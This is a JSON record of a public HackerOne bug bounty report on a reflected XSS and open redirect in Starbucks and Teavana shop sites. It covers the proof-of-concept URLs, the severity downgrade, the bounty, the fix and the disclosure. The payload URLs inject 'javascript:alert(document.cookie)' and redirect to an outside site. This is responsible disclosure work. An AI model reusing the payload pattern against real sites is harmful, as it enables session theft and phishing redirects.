{"id":196846,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTY4NDY=","url":"https://hackerone.com/reports/196846","title":"Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-01-09T09:04:56.079Z","submitted_at":"2017-01-09T09:04:56.079Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"inhibitor181","url":"/inhibitor181","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-06-14T19:38:58.447Z","bug_reporter_agreed_on_going_public_at":"2017-05-15T19:38:52.224Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello, during some open redirects testing, I have noticed a very strange redirect that occured when I had modified a parameter using something like `\u003ecofee`. I have digged up further and then I have noticed that one can make a redirect by modifying GET parameters with this structure : `\u003c\u003e//google.com`\n\nThere seems to be a stripping of tags and after that some chained redirect, that will eventually trigger an XSS vulnerability if the payload is like : `\u003c\u003ejavascript:alert(document.cookie);`.\n\n__So, based on this I have noticed that all your websites except the starbucks.* are vulnerable to an XSS payload that is written directly in the root URL or almost ANY other get parameter__, thus making almost all the websites exploitable with multiple injection points (starbucks.* seems not affected)\n\nPOC EXAMPLES\n-------\n```\nhttps://shop.starbucks.de/\u003c\u003ejavascript:alert(document.cookie);\nhttps://teavana.com/\u003c\u003ejavascript:alert(document.cookie);\nhttps://store.starbucks.com/\u003c\u003ejavascript:alert(document.cookie);\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated\u0026prefv1=\u003c\u003ejavascript:alert('xss parameter');\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=\u003c\u003ejavascript:alert('xss parameter');\n```\n\nBonus - open redirect example :\n```\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated\u0026prefv1=\u003c\u003e//google.com\nhttps://teavana.com/\u003c\u003e//google.com\n```","vulnerability_information_html":"\u003cp\u003eHello, during some open redirects testing, I have noticed a very strange redirect that occured when I had modified a parameter using something like \u003ccode\u003e\u0026gt;cofee\u003c/code\u003e. I have digged up further and then I have noticed that one can make a redirect by modifying GET parameters with this structure : \u003ccode\u003e\u0026lt;\u0026gt;//google.com\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThere seems to be a stripping of tags and after that some chained redirect, that will eventually trigger an XSS vulnerability if the payload is like : \u003ccode\u003e\u0026lt;\u0026gt;javascript:alert(document.cookie);\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSo, based on this I have noticed that all your websites except the starbucks.* are vulnerable to an XSS payload that is written directly in the root URL or almost ANY other get parameter\u003c/strong\u003e, thus making almost all the websites exploitable with multiple injection points (starbucks.* seems not affected)\u003c/p\u003e\n\n\u003ch2 id=\"poc-examples\"\u003ePOC EXAMPLES\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://shop.starbucks.de/\u0026lt;\u0026gt;javascript:alert(document.cookie);\nhttps://teavana.com/\u0026lt;\u0026gt;javascript:alert(document.cookie);\nhttps://store.starbucks.com/\u0026lt;\u0026gt;javascript:alert(document.cookie);\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated\u0026amp;prefv1=\u0026lt;\u0026gt;javascript:alert(\u0026#39;xss parameter\u0026#39;);\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=\u0026lt;\u0026gt;javascript:alert(\u0026#39;xss parameter\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBonus - open redirect example :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated\u0026amp;prefv1=\u0026lt;\u0026gt;//google.com\nhttps://teavana.com/\u0026lt;\u0026gt;//google.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"375.0","formatted_bounty":"$375","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-06-14T19:38:52.258Z","allow_singular_disclosure_after":-111748374.21117291,"singular_disclosure_allowed":true,"vote_count":11,"voters":["spam404","eveeez","pappan","detroitsmash","sumit7","sa1tama0","spetr0x","dr_dragon","rashedhasan007","mrr3boot","and 1 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":12995,"asset_type":"OTHER","asset_identifier":"Other assets","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1409765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @inhibitor181 \n\nThanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you. \n","markdown_message":"\u003cp\u003eHey \u003ca href=\"/inhibitor181\"\u003e@inhibitor181\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThanks for sending this in! We are currently reviewing this submission and we\u0026#39;ll notify you once we have more information to share with you. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-09T22:20:43.157Z","updated_at":"2017-01-09T22:20:43.157Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1416801,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-12T20:05:16.037Z","updated_at":"2017-01-12T20:05:16.037Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":18255,"new_severity_id":19181},"actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1416805,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-12T20:05:27.028Z","updated_at":"2017-01-12T20:05:27.028Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1416812,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-12T20:06:26.769Z","updated_at":"2017-01-12T20:06:26.769Z","additional_data":{"old_title":"High - Open redirect / Reflected XSS payload in root that affects all your sites (store.starbuck.* / shop.starbucks.* / teavana.com)","new_title":"Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com)"},"actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1419458,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @inhibitor181,\n\nThank you for your submission. We downgraded the severity from `High` to `Medium` since that category is reserved for stored XSS attacks against another user. That being said, we've considered the impact across multiple sites and our award amount is reflective of that. \n\nWe've notified the development team for Teavana and our eCommerce sites about the issue and they will be releasing a fix soon. Once it has been deployed, we will reach out to you for a re-test.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/inhibitor181\"\u003e@inhibitor181\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. We downgraded the severity from \u003ccode\u003eHigh\u003c/code\u003e to \u003ccode\u003eMedium\u003c/code\u003e since that category is reserved for stored XSS attacks against another user. That being said, we\u0026#39;ve considered the impact across multiple sites and our award amount is reflective of that. \u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve notified the development team for Teavana and our eCommerce sites about the issue and they will be releasing a fix soon. Once it has been deployed, we will reach out to you for a re-test.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-13T20:27:32.296Z","updated_at":"2017-01-13T20:27:32.296Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"375.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"inhibitor181","url":"/inhibitor181"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1419492,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, thanks for the bounty. I understand your reasoning, no problem. I also put the high severity because there were many injection points across the the sites.\n\nThen I will await when this is fixed for a retest.","markdown_message":"\u003cp\u003eHello, thanks for the bounty. I understand your reasoning, no problem. I also put the high severity because there were many injection points across the the sites.\u003c/p\u003e\n\n\u003cp\u003eThen I will await when this is fixed for a retest.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-13T20:39:42.669Z","updated_at":"2017-01-13T20:39:42.669Z","actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1442093,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @inhibitor181 ,\n\nI have good news - the development team pushed out a fix recently that seems to have addressed this issue. Please confirm that this is no longer reproducible on your end. \n\nThanks for participating in our bounty program and we look forward to working with you in the future!","markdown_message":"\u003cp\u003eHello \u003ca href=\"/inhibitor181\"\u003e@inhibitor181\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI have good news - the development team pushed out a fix recently that seems to have addressed this issue. Please confirm that this is no longer reproducible on your end. \u003c/p\u003e\n\n\u003cp\u003eThanks for participating in our bounty program and we look forward to working with you in the future!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-24T22:37:30.246Z","updated_at":"2017-01-24T22:37:30.246Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"inhibitor181","url":"/inhibitor181"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1442784,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @coldbr3w . This seems to be fixed!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e . This seems to be fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-25T09:31:19.141Z","updated_at":"2017-01-25T09:31:19.141Z","actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1675495,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Public disclosure ?","markdown_message":"\u003cp\u003ePublic disclosure ?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-15T19:38:52.238Z","updated_at":"2017-05-15T19:38:52.238Z","first_to_agree":true,"actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1756163,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-14T19:38:58.478Z","updated_at":"2017-06-14T19:38:58.478Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3265376,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-29T19:09:41.159Z","updated_at":"2018-08-29T19:09:41.159Z","actor":{"username":"tealeaf","cleared":false,"url":"/tealeaf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/288/393/1ac76d5540516a68330a902a1d125dbebfdc2258_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"Other assets","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}